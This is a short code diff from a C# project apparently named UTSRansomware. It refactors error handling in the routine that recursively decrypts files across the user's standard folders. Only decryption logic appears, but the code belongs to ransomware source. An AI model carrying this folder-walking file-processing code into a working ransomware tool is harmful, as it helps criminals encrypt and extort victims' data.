@@ -29,40 +29,38 @@ namespace UTSRansomware
                 string folderPath = Environment.GetFolderPath(folder);
                 if (Directory.Exists(folderPath))
                 {
-                    DecryptDirectory(folderPath);
+                    try
+                    {
+                        DecryptDirectory(folderPath);
+                    }
+                    catch (UnauthorizedAccessException)
+                    {
+                        Console.WriteLine($"Access denied to: {folderPath}. Skipping...");
+                    }
+
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine(ex.ToString());
+                    }
+
                 }
             }
         }
 
         // Decrypts all files in a directory, recursviely calls istelf to decrypt files in sub directories
-        public void DecryptDirectory(string parentDirectory)
+        private void DecryptDirectory(string parentDirectory)
         {
-            try
+            string[] filePaths = Directory.GetFiles(parentDirectory);
+            string[] directoryPaths = Directory.GetDirectories(parentDirectory);
+
+            foreach (string directoryPath in directoryPaths)
             {
-                string[] filePaths = Directory.GetFiles(parentDirectory);
-                string[] directoryPaths = Directory.GetDirectories(parentDirectory);
-
-                foreach (string directoryPath in directoryPaths)
-                {
-                    DecryptDirectory(directoryPath);
-                }
-
-
-                Parallel.ForEach(filePaths, (filePath) =>
-                {
-                    DecryptFile(filePath);
-                });
+                DecryptDirectory(directoryPath);
             }
-            catch (UnauthorizedAccessException)
+            Parallel.ForEach(filePaths, (filePath) =>
             {
-                Console.WriteLine($"Access denied to: {parentDirectory}. Skipping...");
-            }
-
-            catch (Exception ex)
-            {
-                Console.WriteLine(ex.ToString());
-            }
-
+                DecryptFile(filePath);
+            });
         }
 
         // Decrypts a given file
